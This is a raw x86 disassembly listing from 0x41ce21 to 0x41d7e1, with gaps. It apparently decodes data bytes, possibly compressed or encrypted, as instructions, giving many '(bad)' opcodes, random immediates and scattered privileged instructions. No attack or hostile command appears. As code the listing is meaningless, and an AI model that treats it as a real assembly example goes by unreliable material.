  41ce21:	(bad)  
  41ce22:	mov    ah,0x8d
  41ce24:	fwait
  41ce25:	xlat   BYTE PTR ds:[ebx]
  41ce26:	dec    eax
  41ce27:	fldcw  WORD PTR [edi]
  41ce29:	xlat   BYTE PTR ds:[ebx]
  41ce2a:	or     dl,cl
  41ce2c:	scas   al,BYTE PTR es:[edi]
  41ce2d:	into   
  41ce2e:	into   
  41ce2f:	sbb    dh,BYTE PTR [ecx+edi*2-0x77]
  41ce33:	push   ebx
  41ce34:	loop   0x41ce36
	...
  41ce96:	pop    es
  41ce97:	jp     0x41ce81
  41ce99:	jnp    0x41ce98
  41ce9b:	sti    
  41ce9c:	xchg   edi,eax
  41ce9d:	jle    0x41ce2e
  41ce9f:	imul   esp,DWORD PTR [edx+0x5b],0x821b8001
  41cea6:	lea    esi,[ecx]
  41cea8:	add    DWORD PTR [eax],eax
  41ceaa:	pop    es
  41ceab:	add    DWORD PTR [eax],eax
  41cead:	add    BYTE PTR [edi+eiz*2-0x4fda9aa0],al
  41ceb4:	sub    ah,BYTE PTR [esi+0x3a]
  41ceb7:	jne    0x41ceaf
  41ceb9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ceba:	les    edi,FWORD PTR [esi-0x54dac6b0]
  41cec0:	pop    ebp
  41cec1:	int    0x48
  41cec3:	or     ebx,DWORD PTR [edx-0x67e387bb]
  41cec9:	mov    eax,ds:0x33bae3d0
  41cece:	ss push ebx
  41ced0:	inc    eax
  41ced1:	mov    esp,0x75e2376b
  41ced6:	call   0x1b0603d8
  41cedb:	mov    edi,0xa33abf8f
  41cee0:	test   al,0x17
  41cee2:	mov    cl,0x9d
  41cee4:	adc    esp,DWORD PTR [edi]
  41cee6:	mov    bl,0x53
  41cee8:	adc    BYTE PTR [edx-0x67dd1bff],cl
  41ceee:	loopne 0x41cf2b
  41cef0:	(bad)  
  41cef1:	and    DWORD PTR [ebx],ebp
  41cef3:	add    BYTE PTR [edi],ah
  41cef5:	retf   0x383b
  41cef8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cef9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cefa:	hlt    
  41cefb:	pop    esp
  41cefc:	xor    edi,DWORD PTR [ebx]
  41cefe:	sbb    esp,DWORD PTR [eax-0x2c]
  41cf01:	or     dl,dl
  41cf03:	stos   BYTE PTR es:[edi],al
  41cf04:	mov    ds:0x1eaf07d6,eax
  41cf09:	mov    edi,0x59e67ab9
  41cf0e:	add    DWORD PTR [ebx],ecx
  41cf10:	test   BYTE PTR [ebp+ebp*4-0xe4df871],dl
  41cf17:	push   ecx
  41cf18:	jp     0x41cefa
  41cf1a:	dec    ecx
  41cf1b:	(bad)  
  41cf1c:	mov    edx,es
  41cf1e:	test   eax,0xd1d5688a
  41cf23:	jg     0x41cf64
  41cf25:	shl    BYTE PTR [edi],0x9c
  41cf28:	sub    edx,0x2be578ef
  41cf2e:	sbb    ebp,DWORD PTR [ebp+edi*4+0x5]
  41cf32:	xor    al,0xcf
  41cf34:	add    al,BYTE PTR [ecx+0x3e]
  41cf37:	jae    0x41cf6b
  41cf39:	mov    edx,0x61be144c
  41cf3e:	cmp    DWORD PTR [edi],0xfffffff4
  41cf41:	dec    eax
  41cf42:	pop    edx
  41cf43:	sub    ebx,DWORD PTR [eax+eiz*2+0xb6e7f12]
  41cf4a:	mov    ebx,0xce5b8650
  41cf4f:	xor    ebx,edi
  41cf51:	inc    edx
  41cf52:	jnp    0x41cf6a
  41cf54:	jo     0x41cfd4
  41cf56:	add    edi,ebx
  41cf58:	pusha  
  41cf59:	mov    ah,0x71
  41cf5b:	adc    eax,0x73f8f955
  41cf60:	or     al,0x5f
  41cf62:	mov    cl,BYTE PTR [edi]
  41cf64:	push   edi
  41cf65:	lahf   
  41cf66:	in     eax,dx
  41cf67:	or     bh,BYTE PTR [edi+eax*8]
  41cf6a:	dec    eax
  41cf6b:	mov    ebx,0x6a82b363
  41cf70:	sbb    DWORD PTR [ebp-0x7a89787b],esp
  41cf76:	in     eax,dx
  41cf77:	inc    edi
  41cf78:	xrelease xchg BYTE PTR [edi],ch
  41cf7b:	push   eax
  41cf7c:	scas   al,BYTE PTR es:[edi]
  41cf7d:	sub    BYTE PTR [eax+0x26],dh
  41cf80:	sub    BYTE PTR [ebx+0x563b57de],0xbe
  41cf87:	shl    BYTE PTR [esi],0x7e
  41cf8a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cf8b:	inc    eax
  41cf8c:	mov    esp,0xf0677303
  41cf91:	adc    dh,al
  41cf93:	fnstenv [eax]
  41cf95:	fcomp  DWORD PTR [ecx+edx*2-0x4b10d5f7]
  41cf9c:	cmp    ebx,DWORD PTR [eax]
  41cf9e:	repnz sahf 
  41cfa0:	adc    eax,DWORD PTR [ebp+0x3e3379c5]
  41cfa6:	pop    ss
  41cfa7:	arpl   WORD PTR [edi+edx*2+0x7610e48d],di
  41cfae:	add    BYTE PTR [esi],ah
  41cfb0:	adc    edi,eax
  41cfb2:	push   edx
  41cfb3:	retf   0x7e
	...
  41d016:	mov    ecx,0xad432034
  41d01b:	push   edi
  41d01c:	sti    
  41d01d:	(bad)  
  41d01e:	das    
  41d01f:	ret    
  41d020:	lods   al,BYTE PTR ds:[esi]
  41d021:	daa    
  41d022:	retf   0x8b0b
  41d025:	dec    eax
  41d026:	xchg   esp,eax
  41d027:	xor    al,BYTE PTR [ecx]
  41d029:	add    BYTE PTR [edi],al
  41d02b:	add    DWORD PTR [eax],eax
  41d02d:	add    BYTE PTR [edi+0x3a],dh
  41d030:	jmp    0x38d5:0x763c5f91
  41d037:	lea    edi,[ecx]
  41d039:	xchg   ebp,eax
  41d03a:	and    ah,BYTE PTR [ecx]
  41d03c:	pop    esi
  41d03d:	jg     0x41d004
  41d03f:	sbb    ch,bl
  41d041:	cmp    edi,DWORD PTR [eax]
  41d043:	adc    DWORD PTR ds:0x10529a5f,esi
  41d049:	or     ah,0x20
  41d04c:	ds jnp 0x41d0b4
  41d04f:	imul   eax,DWORD PTR [esi+0x3a67108f],0x52394822
  41d059:	inc    edi
  41d05a:	xor    al,0x96
  41d05c:	ins    BYTE PTR es:[edi],dx
  41d05d:	call   0xc5b038c5
  41d062:	in     eax,0xd9
  41d064:	cwde   
  41d065:	sub    ebx,DWORD PTR [edi+0x70ebd6c9]
  41d06b:	mov    ch,0x46
  41d06d:	sub    ah,BYTE PTR [edi]
  41d06f:	cli    
  41d070:	imul   esi,DWORD PTR [ecx+eiz*1],0x1d4672dd
  41d077:	jmp    0x93805af1
  41d07c:	mov    al,ds:0xdc00bb47
  41d081:	out    dx,al
  41d082:	mov    bh,0x7d
  41d084:	cmp    BYTE PTR [ebx+0x7d],0x7e
  41d088:	ret    0x8cfd
  41d08b:	jo     0x41d052
  41d08d:	xchg   ebp,eax
  41d08e:	dec    esp
  41d08f:	dec    ebp
  41d090:	shl    BYTE PTR [eax-0x20],cl
  41d093:	ret    
  41d094:	scas   eax,DWORD PTR es:[edi]
  41d095:	shl    ecx,cl
  41d097:	stos   DWORD PTR es:[edi],eax
  41d098:	mov    WORD PTR [edi-0x640ff6e3],es
  41d09e:	push   es
  41d09f:	xchg   DWORD PTR [ebx+0x21],edi
  41d0a2:	xchg   ebp,eax
  41d0a3:	fisubr DWORD PTR [esi+0x49]
  41d0a6:	pop    esp
  41d0a7:	pop    esi
  41d0a8:	jnp    0x41d125
  41d0aa:	pusha  
  41d0ab:	arpl   WORD PTR [edx+0x1],si
  41d0ae:	sti    
  41d0af:	xchg   esp,eax
  41d0b0:	mov    dl,0xfd
  41d0b2:	data16 scas al,BYTE PTR es:[edi]
  41d0b4:	jecxz  0x41d12c
  41d0b6:	adc    dl,BYTE PTR [edx-0x5b]
  41d0b9:	aam    0xfa
  41d0bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d0bc:	jecxz  0x41d064
  41d0be:	fidiv  DWORD PTR [ebp+eax*8-0x52]
  41d0c2:	xor    DWORD PTR [esi],0x3964d542
  41d0c8:	cwde   
  41d0c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d0ca:	sbb    BYTE PTR [ebx-0x22e3d26f],0x1
  41d0d1:	xor    eax,eax
  41d0d3:	xchg   edx,eax
  41d0d4:	sbb    bh,dl
  41d0d6:	js     0x41d05e
  41d0d8:	mov    dl,bh
  41d0da:	or     cl,dl
  41d0dc:	dec    ecx
  41d0dd:	aam    0x8d
  41d0df:	xor    BYTE PTR [esi],al
  41d0e1:	jns    0x41d0b5
  41d0e3:	fwait
  41d0e4:	test   ecx,ecx
  41d0e6:	cli    
  41d0e7:	ficomp WORD PTR [edx-0x5491d5d1]
  41d0ed:	and    BYTE PTR [edi+0x6b1ed45b],cl
  41d0f3:	adc    DWORD PTR [esi-0x78],ecx
  41d0f6:	xlat   BYTE PTR ds:[ebx]
  41d0f7:	pop    edi
  41d0f8:	dec    esp
  41d0f9:	cmp    al,0xd5
  41d0fb:	imul   ebp,ebx,0x3a376418
  41d101:	mov    eax,0x99dea14a
  41d106:	sbb    ecx,ebp
  41d108:	mov    esi,0x7ae6de39
  41d10d:	adc    edi,eax
  41d10f:	psrlq  mm3,QWORD PTR [esi+0x29]
  41d113:	iret   
  41d114:	loopne 0x41d0e1
  41d116:	push   es
  41d117:	dec    edi
  41d118:	add    DWORD PTR [ebx],edi
  41d11a:	cmp    al,0x76
  41d11c:	hlt    
  41d11d:	xchg   ebx,eax
  41d11e:	adc    al,0x93
  41d120:	cmp    bl,al
  41d122:	adc    BYTE PTR [ecx-0x11],0xaf
  41d126:	out    dx,al
  41d127:	gs pop ss
  41d129:	out    0x47,eax
  41d12b:	xor    DWORD PTR [ecx+0x4f58550d],eax
  41d131:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d132:	out    0xad,al
  41d134:	cli    
	...
  41d195:	add    BYTE PTR [eax-0x3d],dl
  41d198:	cmp    ecx,DWORD PTR ds:0xdf76fdbb
  41d19e:	sti    
  41d19f:	aad    0x81
  41d1a1:	loopne 0x41d1d6
  41d1a3:	out    0xa8,eax
  41d1a5:	popa   
  41d1a6:	fwait
  41d1a7:	xor    eax,DWORD PTR [ecx]
  41d1a9:	add    BYTE PTR [edi],al
  41d1ab:	add    DWORD PTR [eax],eax
  41d1ad:	add    BYTE PTR [ecx-0x5a],dh
  41d1b0:	jl     0x41d165
  41d1b2:	inc    edx
  41d1b3:	mov    ebp,0xcb560bb8
  41d1b8:	out    0xdd,al
  41d1ba:	dec    edx
  41d1bb:	mov    ecx,0x14b0b1f2
  41d1c0:	nop
  41d1c1:	sub    edi,DWORD PTR [eax-0x239a79a9]
  41d1c7:	call   0xc92d:0xc63916b8
  41d1ce:	mov    eax,0x824c03ad
  41d1d3:	pop    esi
  41d1d4:	sub    eax,0xe7946e68
  41d1d9:	pop    ecx
  41d1da:	adc    esi,DWORD PTR [edx-0x2dcab0fb]
  41d1e0:	xchg   edx,eax
  41d1e1:	add    eax,0x9b4dbe20
  41d1e6:	cdq    
  41d1e7:	push   0xffffffab
  41d1e9:	in     eax,dx
  41d1ea:	dec    ebp
  41d1eb:	pop    ebp
  41d1ec:	push   ebx
  41d1ed:	jmp    0xe2d2fc25
  41d1f2:	jno    0x41d255
  41d1f4:	loop   0x41d1a9
  41d1f6:	fchs   
  41d1f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d1f9:	add    BYTE PTR [ebx+ebx*8],bh
  41d1fc:	sbb    eax,DWORD PTR [esi+0x78057fd4]
  41d202:	xor    cl,BYTE PTR ss:[edx+0x6a3d4986]
  41d209:	push   ecx
  41d20a:	push   cs
  41d20b:	push   0x1e
  41d20d:	lods   al,BYTE PTR ds:[esi]
  41d20e:	jmp    FWORD PTR [ebx+0x1]
  41d211:	imul   ebx,esi,0x64
  41d214:	adc    esp,ebx
  41d216:	dec    edi
  41d217:	push   ds
  41d218:	loope  0x41d27d
  41d21a:	pop    ebp
  41d21b:	push   ebx
  41d21c:	outs   dx,DWORD PTR ds:[esi]
  41d21d:	and    eax,DWORD PTR [edx+0x40]
  41d220:	inc    edi
  41d221:	sbb    ah,BYTE PTR [esi]
  41d223:	jl     0x41d263
  41d225:	push   edx
  41d226:	mul    BYTE PTR [edx]
  41d228:	push   ecx
  41d229:	out    0x29,eax
  41d22b:	pop    ds
  41d22c:	fiadd  WORD PTR [eax]
  41d22e:	fld    TBYTE PTR [esi+0x75d45ab8]
  41d234:	xchg   esi,eax
  41d235:	aaa    
  41d236:	pop    ebp
  41d237:	xor    DWORD PTR [esp+eax*1+0x24a09da9],edi
  41d23e:	retf   
  41d23f:	dec    eax
  41d240:	(bad)  
  41d241:	(bad)  [edi-0x36c2aa2c]
  41d247:	shl    dl,cl
  41d249:	and    edi,0x3f7e2e5d
  41d24f:	fdivr  QWORD PTR [ecx-0x7e]
  41d252:	jmp    0x3a3ff3ea
  41d257:	into   
  41d258:	add    ebx,DWORD PTR ds:0x237e1e94
  41d25e:	lahf   
  41d25f:	fild   WORD PTR [edx]
  41d261:	adc    BYTE PTR [ecx+0x21596990],dl
  41d267:	and    dh,dh
  41d269:	ins    DWORD PTR es:[edi],dx
  41d26a:	dec    edx
  41d26b:	jmp    0x41d2a4
  41d26d:	cmp    edx,esi
  41d26f:	ror    BYTE PTR [ebx+0x4174174d],0x1c
  41d276:	or     eax,0xd6b430d3
  41d27b:	retf   
  41d27c:	bnd ja 0x41d235
  41d27f:	inc    esp
  41d280:	pop    edi
  41d281:	ds jb  0x41d2b2
  41d284:	mov    ch,0xbf
  41d286:	pop    ss
  41d287:	add    DWORD PTR [edx],edi
  41d289:	xorps  xmm0,XMMWORD PTR [ebx-0x57c4ee6d]
  41d290:	mov    ebp,0xd558c181
  41d295:	scas   al,BYTE PTR es:[edi]
  41d296:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d297:	aam    0x96
  41d299:	mov    ecx,0x5f068f91
  41d29e:	sbb    ah,cl
  41d2a0:	rcr    DWORD PTR [ebp+0x5655c624],1
  41d2a6:	shr    DWORD PTR [edi],cl
  41d2a8:	fidivr WORD PTR [edx+0x7e53428]
  41d2ae:	out    0xc0,eax
  41d2b0:	pop    es
  41d2b1:	mov    bh,0x3a
  41d2b3:	es push eax
	...
  41d315:	add    dh,bh
  41d317:	cmp    cl,0x54
  41d31a:	(bad)  
  41d31b:	jge    0x41d31c
  41d31d:	stos   BYTE PTR es:[edi],al
  41d31e:	sbb    BYTE PTR [ebx-0x1acc7a82],ch
  41d324:	in     al,0x89
  41d326:	mov    ds:0x7000134,al
  41d32b:	add    DWORD PTR [eax],eax
  41d32d:	add    dl,ah
  41d32f:	pop    ecx
  41d330:	shl    esp,0xe4
  41d333:	sbb    al,0x78
  41d335:	mov    ch,0xb5
  41d337:	pop    ebx
  41d338:	push   cs
  41d339:	mov    edx,0x4340885a
  41d33e:	push   edx
  41d33f:	mov    esi,0x7d725306
  41d344:	lods   al,BYTE PTR ds:[esi]
  41d345:	ror    DWORD PTR [ebp+0x60],1
  41d348:	xlat   BYTE PTR ds:[ebx]
  41d349:	add    eax,0x3875147d
  41d34e:	data16 test al,0x71
  41d351:	or     DWORD PTR [edx-0x4a],edx
  41d354:	add    edx,DWORD PTR [eax]
  41d356:	sub    eax,0x1fbe82a5
  41d35b:	test   DWORD PTR [eax-0x474c57ed],esp
  41d361:	outs   dx,DWORD PTR ds:[esi]
  41d362:	cli    
  41d363:	sbb    BYTE PTR [eax+0x19],cl
  41d366:	jmp    0xbdc6:0xf4d0c2f0
  41d36d:	sbb    al,0x9b
  41d36f:	xor    BYTE PTR [edx],ch
  41d371:	mov    al,ds:0xa87ae6b5
  41d376:	jl     0x41d315
  41d378:	jmp    0xa856:0x67008206
  41d37f:	mov    bl,0xa0
  41d381:	je     0x41d3c6
  41d383:	sub    al,0xf1
  41d385:	out    dx,al
  41d386:	loopne 0x41d343
  41d388:	cld    
  41d389:	mov    al,0x1b
  41d38b:	into   
  41d38c:	xlat   BYTE PTR ds:[ebx]
  41d38d:	push   ecx
  41d38e:	mov    al,0x95
  41d390:	push   es
  41d391:	ds jb  0x41d356
  41d394:	mov    cl,0x1b
  41d396:	cdq    
  41d397:	mov    ?,WORD PTR [eax-0x7b64041c]
  41d39d:	hlt    
  41d39e:	mov    WORD PTR [esi+0xd],gs
  41d3a1:	sbb    DWORD PTR [edx],esi
  41d3a3:	retf   0xdc28
  41d3a6:	jmp    0x41d3bd
  41d3a8:	sub    eax,0x8fbfb5ae
  41d3ad:	clc    
  41d3ae:	loop   0x41d420
  41d3b0:	cmc    
  41d3b1:	or     esp,DWORD PTR [ebx]
  41d3b3:	adc    edx,DWORD PTR [si-0x6b]
  41d3b7:	add    eax,DWORD PTR [ecx+0x4c]
  41d3ba:	iret   
  41d3bb:	repz imul ecx,ebx,0x44
  41d3bf:	xchg   ebx,eax
  41d3c0:	xchg   ebx,eax
  41d3c1:	(bad)  
  41d3c2:	enter  0x53d5,0xc0
  41d3c6:	iret   
  41d3c7:	scas   al,BYTE PTR es:[edi]
  41d3c8:	repz ja 0x41d41a
  41d3cb:	std    
  41d3cc:	sub    al,0x50
  41d3ce:	loop   0x41d42d
  41d3d0:	ins    DWORD PTR es:[edi],dx
  41d3d1:	xchg   esi,eax
  41d3d2:	rcl    BYTE PTR [edx+0x43],cl
  41d3d5:	jge    0x41d3e7
  41d3d7:	adc    ah,cl
  41d3d9:	pop    esi
  41d3da:	and    ah,BYTE PTR [edi]
  41d3dc:	(bad)  
  41d3dd:	sbb    edi,DWORD PTR [edx+0x2b687c44]
  41d3e3:	cld    
  41d3e4:	mov    ebx,0x7d315601
  41d3e9:	sar    BYTE PTR [ecx+0x30],cl
  41d3ec:	sbb    DWORD PTR [ebp-0x4a],edx
  41d3ef:	scas   al,BYTE PTR es:[edi]
  41d3f0:	jns    0x41d429
  41d3f2:	sub    ch,BYTE PTR [ebx]
  41d3f4:	test   esi,ecx
  41d3f6:	pop    esi
  41d3f7:	and    esi,DWORD PTR [eax-0x68ee8f7]
  41d3fd:	push   eax
  41d3fe:	pop    ds
  41d3ff:	jno    0x41d410
  41d401:	push   edi
  41d402:	fmul   QWORD PTR [eax-0x206d8d2c]
  41d408:	push   cs
  41d409:	cmc    
  41d40a:	push   eax
  41d40b:	cmp    bh,BYTE PTR [esi-0x3f]
  41d40e:	add    al,0x78
  41d410:	jne    0x41d42a
  41d412:	stos   DWORD PTR es:[edi],eax
  41d413:	(bad)  
  41d414:	sbb    ah,dl
  41d416:	mov    edx,0x24594c7
  41d41b:	xlat   BYTE PTR ds:[ebx]
  41d41c:	sub    al,0xe5
  41d41e:	fild   QWORD PTR [ecx-0x52]
  41d421:	inc    ecx
  41d422:	pushf  
  41d423:	and    eax,0xbb981f76
  41d428:	into   
  41d429:	xchg   esi,eax
  41d42a:	sub    esp,DWORD PTR [ebx]
  41d42c:	sub    al,0x40
  41d42e:	add    al,0x52
  41d430:	mov    al,0x87
  41d432:	arpl   di,bp
  41d434:	retf   
	...
  41d495:	add    dh,dh
  41d497:	rcl    BYTE PTR ss:[edx+edx*8-0x2e89090c],cl
  41d49f:	fwait
  41d4a0:	aad    0xa2
  41d4a2:	nop
  41d4a3:	enter  0x7886,0xa9
  41d4a7:	xor    eax,0x1070001
  41d4ac:	add    BYTE PTR [eax],al
  41d4ae:	mov    eax,0xa6e69732
  41d4b3:	imul   ebp,DWORD PTR [edi-0x79],0xaa461fd5
  41d4ba:	or     eax,0x50e2e74f
  41d4bf:	(bad)  
  41d4c1:	(bad)  
  41d4c2:	popa   
  41d4c3:	imul   DWORD PTR [ebp+0x23]
  41d4c6:	xor    ebp,DWORD PTR [ecx+0x6fe7fd9b]
  41d4cc:	dec    edi
  41d4cd:	pop    edx
  41d4ce:	repnz ds fs mov bl,0x54
  41d4d3:	push   0x57
  41d4d5:	gs mov al,0x3
  41d4d8:	mov    bh,0xc1
  41d4da:	mov    al,0x97
  41d4dc:	inc    eax
  41d4dd:	das    
  41d4de:	out    dx,eax
  41d4df:	dec    edx
  41d4e0:	cmp    al,0x20
  41d4e2:	aaa    
  41d4e3:	sbb    esi,eax
  41d4e5:	and    al,0xc6
  41d4e7:	arpl   WORD PTR [edi+0x7d],dx
  41d4ea:	sub    eax,0x957a9206
  41d4ef:	js     0x41d48d
  41d4f1:	cmp    al,0xfc
  41d4f3:	push   0x41
  41d4f5:	pop    ebx
  41d4f6:	int    0x6b
  41d4f8:	int    0xbf
  41d4fa:	or     eax,0x463e4a35
  41d4ff:	ret    
  41d500:	mov    ds:0x67d3abe3,al
  41d505:	in     ax,dx
  41d507:	shr    BYTE PTR [edx+0x46e7d25a],1
  41d50d:	inc    ebx
  41d50e:	xchg   edx,eax
  41d50f:	mov    edx,0x4b64e778
  41d514:	adc    ebx,edi
  41d516:	cwde   
  41d517:	xchg   ecx,eax
  41d518:	sub    BYTE PTR [esi+0x3c],ah
  41d51b:	inc    esp
  41d51c:	leave  
  41d51d:	or     cl,ah
  41d51f:	xlat   BYTE PTR ds:[ebx]
  41d520:	rol    DWORD PTR [esi-0x6a3ad88e],0x6d
  41d527:	stos   DWORD PTR es:[edi],eax
  41d528:	(bad)  
  41d529:	(bad)  
  41d52a:	aad    0x37
  41d52c:	push   edx
  41d52d:	enter  0x2f78,0x62
  41d531:	mov    al,BYTE PTR [edx+0x51abbf1c]
  41d537:	sbb    BYTE PTR [ebp+0x33dd40d7],ch
  41d53d:	cmovl  edx,DWORD PTR [ecx]
  41d540:	les    ebx,FWORD PTR ds:0x1ebf2963
  41d546:	or     BYTE PTR [edi+0x56c225a7],bh
  41d54c:	or     DWORD PTR [ecx],ecx
  41d54e:	jmp    0x41d502
  41d550:	lock pop ds
  41d552:	push   ebx
  41d553:	jge    0x41d5a8
  41d555:	cmp    BYTE PTR [eax],ah
  41d557:	sub    eax,0xa4c28afa
  41d55c:	out    dx,al
  41d55d:	jge    0x41d53b
  41d55f:	(bad)  [ecx+0x3d]
  41d562:	ins    DWORD PTR es:[edi],dx
  41d563:	jge    0x41d5d2
  41d565:	mov    esi,0xb066e0d0
  41d56a:	push   ss
  41d56b:	xlat   BYTE PTR ds:[ebx]
  41d56c:	add    ebp,DWORD PTR [ecx]
  41d56e:	leave  
  41d56f:	add    dh,ch
  41d571:	adc    edi,DWORD PTR [ebp+0xa06e8f8]
  41d577:	clc    
  41d578:	outs   dx,DWORD PTR ds:[esi]
  41d579:	adc    bh,BYTE PTR [eax+ebp*1-0x241d9c72]
  41d580:	and    BYTE PTR [edi],bl
  41d582:	fldcw  WORD PTR [ecx-0x61]
  41d585:	out    0xdc,eax
  41d587:	shl    BYTE PTR [edi],cl
  41d589:	fistp  WORD PTR [edx-0x10]
  41d58c:	adc    BYTE PTR [ecx-0x80],cl
  41d58f:	in     al,0x31
  41d591:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d592:	xchg   esp,eax
  41d593:	ins    DWORD PTR es:[edi],dx
  41d594:	popa   
  41d595:	je     0x41d604
  41d597:	(bad)
  41d59b:	lock popa 
  41d59d:	ds js  0x41d53c
  41d5a0:	xchg   ebx,eax
  41d5a1:	push   ss
  41d5a2:	or     BYTE PTR [ecx],bh
  41d5a4:	xchg   esi,eax
  41d5a5:	push   cs
  41d5a6:	cmp    al,BYTE PTR [eax+0x355c8c4d]
  41d5ac:	xor    BYTE PTR [eax+0x14],dh
  41d5af:	push   ss
  41d5b0:	outs   dx,BYTE PTR ds:[esi]
  41d5b1:	add    al,0x7d
  41d5b3:	and    edx,DWORD PTR [ecx+0x0]
	...
  41d616:	jl     0x41d5b1
  41d618:	dec    esp
  41d619:	jbe    0x41d608
  41d61b:	idiv   DWORD PTR [esi-0x65]
  41d61e:	mov    al,BYTE PTR [edi+0x7a24d221]
  41d624:	jne    0x41d66d
  41d626:	mov    al,0x36
  41d628:	add    DWORD PTR [eax],eax
  41d62a:	pop    es
  41d62b:	add    DWORD PTR [eax],eax
  41d62d:	add    BYTE PTR [edx-0x67dd99c9],dl
  41d633:	or     al,0x8f
  41d635:	inc    ebp
  41d636:	outs   dx,BYTE PTR ds:[esi]
  41d637:	push   esi
  41d638:	pusha  
  41d639:	ins    BYTE PTR es:[edi],dx
  41d63a:	in     al,dx
  41d63b:	pop    es
  41d63c:	push   es
  41d63d:	test   DWORD PTR [ecx-0x62],ecx
  41d640:	add    al,cl
  41d642:	and    al,0x3f
  41d644:	or     al,0x6
  41d646:	rcr    BYTE PTR [ecx+0x7c568e9],1
  41d64c:	mov    ss,ebp
  41d64e:	xchg   BYTE PTR [ecx+0x3bf80751],bh
  41d654:	pop    ebp
  41d655:	icebp  
  41d656:	popa   
  41d657:	mov    ebx,0x564f8380
  41d65c:	sbb    ch,al
  41d65e:	cmp    DWORD PTR [eax+0x7f72d8a6],esp
  41d664:	sbb    al,0x34
  41d666:	out    0xec,al
  41d668:	or     BYTE PTR [ebx+edi*2],dl
  41d66b:	adc    DWORD PTR [ecx],ebp
  41d66d:	cmp    DWORD PTR [ebx+0x48],esp
  41d670:	inc    edi
  41d671:	add    eax,esi
  41d673:	sub    BYTE PTR [ecx+0x2],ah
  41d676:	pushf  
  41d677:	pop    edi
  41d678:	xor    BYTE PTR [eax+ebp*8],dh
  41d67b:	(bad)  
  41d67c:	xchg   esi,eax
  41d67d:	repz rol DWORD PTR [esi-0x3825d2f0],cl
  41d684:	fisttp DWORD PTR [ebx]
  41d686:	sbb    eax,0xfc8708f0
  41d68b:	mov    ?,ebx
  41d68d:	mul    BYTE PTR [eax-0x3f]
  41d690:	fcmovnb st,st(5)
  41d692:	repz (bad) 
  41d694:	scas   al,BYTE PTR es:[edi]
  41d695:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d696:	push   ds
  41d697:	enter  0x9520,0xa7
  41d69b:	imul   ebp,DWORD PTR [ecx-0x3ec11801],0x71
  41d6a2:	pop    esi
  41d6a3:	jnp    0x41d664
  41d6a5:	fnstcw WORD PTR [ebp+0x20]
  41d6a8:	stc    
  41d6a9:	add    edx,DWORD PTR [ecx]
  41d6ab:	add    ecx,DWORD PTR [eax-0x1]
  41d6ae:	push   es
  41d6af:	jmp    0x41d72e
  41d6b1:	jmp    0xbf61:0xad09d63b
  41d6b8:	pop    edi
  41d6b9:	into   
  41d6ba:	icebp  
  41d6bb:	lahf   
  41d6bc:	xor    al,0x5a
  41d6be:	or     al,0x9e
  41d6c0:	jbe    0x41d6bd
  41d6c2:	ds addr16 mov dl,0x0
  41d6c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d6c7:	fdivr  QWORD PTR [esi+0x41]
  41d6ca:	in     eax,dx
  41d6cb:	sub    BYTE PTR [ebx+0x15],bh
  41d6ce:	shl    DWORD PTR [eax-0x10],1
  41d6d1:	pushf  
  41d6d2:	sub    esi,DWORD PTR [bp+si]
  41d6d5:	lds    esp,FWORD PTR [edi-0x13313d3d]
  41d6db:	stc    
  41d6dc:	jp     0x41d700
  41d6de:	adc    cl,BYTE PTR [edi]
  41d6e0:	and    eax,0xc3a3f2ab
  41d6e5:	ret    
  41d6e6:	push   ss
  41d6e7:	jmp    0x2312:0x2ec1d15c
  41d6ee:	mov    eax,0xe143b4bb
  41d6f3:	imul   eax,DWORD PTR [eax-0x7c],0x420dda11
  41d6fa:	adc    eax,0xe3657ea5
  41d6ff:	and    DWORD PTR [edx-0x544a98fe],esp
  41d705:	dec    edi
  41d706:	inc    edi
  41d707:	mov    bh,al
  41d709:	test   DWORD PTR ds:0xf1920e7f,esp
  41d70f:	and    DWORD PTR [edx],edx
  41d711:	in     al,dx
  41d712:	(bad)  
  41d713:	and    al,BYTE PTR [edi-0x6]
  41d716:	push   ss
  41d717:	ss dec ebx
  41d719:	cmp    al,0xee
  41d71b:	or     eax,0xcfc63833
  41d720:	pop    eax
  41d721:	push   eax
  41d722:	sbb    al,0x52
  41d724:	jb     0x41d6bc
  41d726:	scas   al,BYTE PTR es:[edi]
  41d727:	sti    
  41d728:	scas   al,BYTE PTR es:[edi]
  41d729:	lds    eax,FWORD PTR [edi]
  41d72b:	pop    es
  41d72c:	sbb    eax,0x6111ec75
  41d731:	and    ah,BYTE PTR [esi+0x8425]
	...
  41d793:	add    BYTE PTR [eax],al
  41d795:	add    BYTE PTR [esi+ecx*8],ah
  41d798:	outs   dx,BYTE PTR ds:[esi]
  41d799:	sub    ch,dh
  41d79b:	stos   BYTE PTR es:[edi],al
  41d79c:	fs into 
  41d79e:	push   ecx
  41d79f:	pop    ebp
  41d7a0:	or     esp,edi
  41d7a2:	mov    ah,0x73
  41d7a4:	repz cld 
  41d7a6:	mov    bh,0x37
  41d7a8:	add    DWORD PTR [eax],eax
  41d7aa:	pop    es
  41d7ab:	add    DWORD PTR [eax],eax
  41d7ad:	add    BYTE PTR [esi+0x6e1f5770],dh
  41d7b3:	stos   DWORD PTR es:[edi],eax
  41d7b4:	jnp    0x41d759
  41d7b6:	gs retf 0x2e17
  41d7ba:	xchg   DWORD PTR [ebx],esp
  41d7bc:	add    eax,0x14bb12a
  41d7c1:	shl    DWORD PTR [edx-0x79],0x77
  41d7c5:	cmp    BYTE PTR [edx],bh
  41d7c7:	test   al,0xfc
  41d7c9:	cmp    eax,0x171b5033
  41d7ce:	xor    BYTE PTR [ebx*1+0x519d6afb],dh
  41d7d5:	jbe    0x41d7ec
  41d7d7:	jae    0x41d7e9
  41d7d9:	test   ah,ch
  41d7db:	int3   
  41d7dc:	loopne 0x41d81f
  41d7de:	and    DWORD PTR [edx],esp
  41d7e0:	into   
  41d7e1:	mov    ecx,DWORD PTR [ebx+ecx*8+0x4a]
